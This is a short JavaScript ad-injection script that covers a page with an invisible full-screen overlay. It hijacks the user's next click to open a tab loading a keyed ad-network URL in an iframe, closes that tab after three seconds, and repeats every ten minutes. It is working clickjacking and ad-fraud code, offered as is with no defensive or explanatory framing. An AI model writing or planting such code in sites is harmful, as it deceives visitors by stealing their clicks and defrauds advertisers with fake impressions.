console.log("Ads Injected.");
var targetUrl = "https://www.effectiveratecpm.com/jmzq26nu?key=362a2802eeb1b13df2f74ab21f27a973";

function showOverlay() {
  fetch(targetUrl, { method: "GET", mode: "no-cors" })
    .then(function(response) {
      var overlay = document.createElement('div');
      overlay.style.position = 'fixed';
      overlay.style.top = '0';
      overlay.style.left = '0';
      overlay.style.width = '100%';
      overlay.style.height = '100%';
      overlay.style.zIndex = '999999';
      overlay.style.backgroundColor = 'rgba(0,0,0,0)';
      overlay.style.cursor = 'pointer';
      
      function handleClick() {
        var newTab = window.open("", "_blank");
        if (newTab) {
          newTab.document.write(
            '<!DOCTYPE html><html><head><title>Ad</title></head>' +
            '<body style="margin:0;">' +
            '<iframe src="' + targetUrl + '" style="position:fixed; top:0; left:0; width:100%; height:100%; border:none;"></iframe>' +
            '</body></html>'
          );
          newTab.document.close();
          
          setTimeout(function() {
            newTab.close();
          }, 3000);
        }
        overlay.removeEventListener('click', handleClick);
        document.body.removeChild(overlay);
        setTimeout(showOverlay, 600000);
      }
      
      overlay.addEventListener('click', handleClick);
      document.body.appendChild(overlay);
    })
    .catch(function(error) {
      console.error("Error during GET request:", error);
      setTimeout(showOverlay, 600000);
    });
}

showOverlay();